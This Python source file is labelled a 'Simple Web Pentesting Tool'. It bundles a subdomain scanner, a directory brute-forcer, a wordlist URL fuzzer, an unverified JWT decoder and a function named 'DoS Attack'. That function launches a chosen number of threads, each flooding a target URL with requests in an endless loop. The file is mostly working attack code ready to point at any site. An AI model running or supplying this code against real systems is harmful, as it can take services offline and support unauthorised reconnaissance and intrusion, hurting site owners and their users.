import requests
import threading
import queue
import argparse
import jwt

# Subdomain Finder
def subdomain_finder(domain, subdomains_file):
    with open(subdomains_file, "r") as file:
        subdomains = file.readlines()

    for subdomain in subdomains:
        subdomain = subdomain.strip()
        url = f"http://{subdomain}.{domain}"
        try:
            response = requests.get(url)
            if response.status_code == 200:
                print(f"[+] Found: {url}")
        except requests.ConnectionError:
            pass

# Directory Brute-forcer
def directory_bruteforce(url, directories_file):
    with open(directories_file, "r") as file:
        directories = file.readlines()

    for directory in directories:
        directory = directory.strip()
        full_url = f"{url}/{directory}"
        try:
            response = requests.get(full_url)
            if response.status_code == 200:
                print(f"[+] Found: {full_url}")
        except requests.ConnectionError:
            pass

# Fuzzing and Brute-forcing
def fuzz(url, fuzz_file):
    with open(fuzz_file, "r") as file:
        payloads = file.readlines()

    for payload in payloads:
        payload = payload.strip()
        target_url = url.replace("FUZZ", payload)
        try:
            response = requests.get(target_url)
            if response.status_code == 200:
                print(f"[+] Valid Payload: {payload} at {target_url}")
        except requests.ConnectionError:
            pass

# JWT Content Inspector
def jwt_inspector(jwt_token):
    try:
        decoded = jwt.decode(jwt_token, options={"verify_signature": False})
        print(f"[+] JWT Content: {decoded}")
    except jwt.ExpiredSignatureError:
        print("[-] JWT Expired")
    except jwt.InvalidTokenError:
        print("[-] Invalid JWT")

# DoS Attack
def dos_attack(url, num_requests):
    def attack():
        while True:
            try:
                requests.get(url)
                print(f"[+] Sent request to {url}")
            except requests.ConnectionError:
                pass

    threads = []
    for _ in range(num_requests):
        thread = threading.Thread(target=attack)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

# Argument Parser
def main():
    parser = argparse.ArgumentParser(description="Simple Web Pentesting Tool")
    parser.add_argument("-d", "--domain", help="Target domain for subdomain scanning")
    parser.add_argument("-s", "--subdomains", help="Subdomain wordlist file")
    parser.add_argument("-u", "--url", help="Target URL for directory bruteforcing, fuzzing, and DoS attack")
    parser.add_argument("-df", "--directories", help="Directory wordlist file")
    parser.add_argument("-f", "--fuzz", help="Fuzz wordlist file")
    parser.add_argument("-jwt", "--jwt", help="JWT token to inspect")
    parser.add_argument("-dos", "--dos", type=int, help="Number of threads for DoS attack")

    args = parser.parse_args()

    if args.domain and args.subdomains:
        print(f"Scanning subdomains for {args.domain}...")
        subdomain_finder(args.domain, args.subdomains)

    if args.url and args.directories:
        print(f"Brute-forcing directories on {args.url}...")
        directory_bruteforce(args.url, args.directories)

    if args.url and args.fuzz:
        print(f"Fuzzing {args.url}...")
        fuzz(args.url, args.fuzz)

    if args.jwt:
        print(f"Inspecting JWT token...")
        jwt_inspector(args.jwt)

    if args.url and args.dos:
        print(f"Performing DoS attack on {args.url}...")
        dos_attack(args.url, args.dos)

if __name__ == "__main__":
    main()
